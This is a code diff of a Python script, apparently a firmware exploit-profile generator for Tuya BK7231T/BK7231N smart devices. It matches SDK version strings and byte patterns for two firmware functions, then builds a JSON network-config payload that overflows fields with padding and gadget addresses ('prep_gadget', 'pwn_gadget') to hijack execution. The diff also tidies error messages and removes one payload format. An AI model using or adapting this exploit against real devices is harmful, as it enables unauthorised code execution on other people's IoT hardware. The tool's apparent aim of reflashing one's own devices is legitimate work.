@@ -157,7 +157,7 @@ def walk_app_code(appcode: bytes):
         # 3 matches, 2nd is correct
         process_generic("BK7231T", 1, 1, "2b68301c9847", 1, 0, "041e07d1119b211c00", 3, 1)
         return
-        
+
     # Newer versions of BK7231T, BS 40.00, SDK 1.0.x
     if b'BY embed FOR ty_iot_wf_bt_sdk_bk AT bk7231t' in appcode:
         # 23 68 38 1c 98 47 is the byte pattern for ty_cJSON_Parse entry
@@ -170,10 +170,10 @@ def walk_app_code(appcode: bytes):
     # Strange apparently 1-off version with a BK7231N SDK adapted to BK7231T, BS 40.00, SDK 2.3.2
     if b'BY embed FOR ty_iot_sdk AT bk7231t' in appcode:
         # TODO: Figure out how to process this format
-        raise RuntimeError("This device use an unusual SDK and there is currently no pattern to mach it.")
-        #process_generic("BK7231T", 3, 1/2/3, "", 0, 0, "", 0, 0) # Uknown if payload_version is 1, 2, or 3, more likely 2 or 3
+        raise RuntimeError("This device uses an unusual SDK and there is currently no pattern to mach it.")
+        #process_generic("BK7231T", 3, 1/2, "", 0, 0, "", 0, 0) # Uknown if payload_version is 1 or 2, more likely 2
         return
-        
+
     # Older (relatively, at least it existed first from sample data) version of BK7231N, BS 40.00, SDK 2.3.1
     if b'embed FOR ty_iot_sdk AT bk7231n' in appcode:
         # 43 68 20 1c 98 47 is the byte pattern for ty_cJSON_Parse entry
@@ -183,7 +183,6 @@ def walk_app_code(appcode: bytes):
         process_generic("BK7231N", 1, 2, "4368201c9847", 1, 0, "051e00d115e7", 1, 0)
         return
 
-       
     # Newer (relatively, first build is after the "older" sdk) version of BK7231N, BS 40.00, SDK 2.3.1
     if b'FOR ty_iot_sdk_bk7231n AT bk7231n' in appcode:
         # 43 68 20 1c 98 47 is the byte pattern for ty_cJSON_Parse entry
@@ -192,14 +191,14 @@ def walk_app_code(appcode: bytes):
         # 1 match should be found
         process_generic("BK7231N", 2, 2, "4368201c9847", 1, 0, "051e00d115e7", 1, 0)
         return
-        
+
     # Newest version of N, BS 40.00, SDK 2.3.3
     if b'ci_manage FOR ty_iot_sdk AT bk7231n' in appcode:
         # 43 68 20 1c 98 47 is the byte pattern for ty_cJSON_Parse entry
         # 1 match should be found
         # 05 1e 00 d1 fc e6 is the byte pattern for mf_cmd_process execution
         # 1 match should be found
-        process_generic("BK7231N", 3, 3, "4368201c9847", 1, 0, "051e00d1fce6", 1, 0)
+        process_generic("BK7231N", 3, 2, "4368201c9847", 1, 0, "051e00d1fce6", 1, 0)
         return
 
     raise RuntimeError('Unknown pattern, please open a new issue and include the bin.')
@@ -234,11 +233,8 @@ def process_generic(chipset, pattern_version, payload_version, ty_json_parse_str
     elif payload_version == 2:
         make_profile_format2(chipset, ty_cjson_parse_addr, mf_cmd_process_addr)
         return
-    elif payload_version == 3:
-        make_profile_format3(chipset, ty_cjson_parse_addr, mf_cmd_process_addr)
-        return
         
-    raise RuntimeError("Unknown chipset, unable to generate profile")
+    raise RuntimeError("Unknown chipset, unable to generate profile, please open a new issue and include the bin.")
 
 # Used by nearly all BK7231T devices
 def make_profile_format1(chipset, ty_cjson_parse_addr, mf_cmd_process_addr):
@@ -264,30 +260,8 @@ def make_profile_format1(chipset, ty_cjson_parse_addr, mf_cmd_process_addr):
     print("[+] Profile:")
     print(json.dumps(data, indent=4))
     
-# Used by some BK7231N devices
+# Used by nearly all BK7231N devices
 def make_profile_format2(chipset, ty_cjson_parse_addr, mf_cmd_process_addr):
-    profile_builder = ProfileBuilder()
-    prep_gadget = ty_cjson_parse_addr.to_bytes(3, byteorder="little")
-    pwn_gadget = mf_cmd_process_addr.to_bytes(3, byteorder="little")
-    payload = b'{"ssid":"AAAA' + pwn_gadget + b'","auzkey":"' + profile_builder.AUTHKEY_TEMPLATE.encode('utf-8') + b'","uuid":"' + profile_builder.UUID_TEMPLATE.encode('utf-8') + b'","pskKey":"","prod_test":false,"ap_ssid":"A","ssid":"A","token":"' + b'A' * 72 + prep_gadget + b'"}'
-    payload = profile_builder.check_valid_payload(payload)
-
-    datagram = profile_builder.build_network_config_packet(payload=payload)
-    datagram_padding = b'B' * (256-len(datagram))
-
-    data = {
-        'chip': f'{chipset}',
-        'payload': base64.b64encode(payload).decode('utf-8'),
-        'authkey_template': f'{profile_builder.AUTHKEY_TEMPLATE}',
-        'uuid_template': f'{profile_builder.UUID_TEMPLATE}',
-        'datagram_padding': base64.b64encode(datagram_padding).decode('utf-8')
-    }
-
-    print("[+] Profile:")
-    print(json.dumps(data, indent=4))
-    
-# Used by some BK7231N devices
-def make_profile_format3(chipset, ty_cjson_parse_addr, mf_cmd_process_addr):
     profile_builder = ProfileBuilder()
     prep_gadget = ty_cjson_parse_addr.to_bytes(3, byteorder="little")
     pwn_gadget = mf_cmd_process_addr.to_bytes(3, byteorder="little")
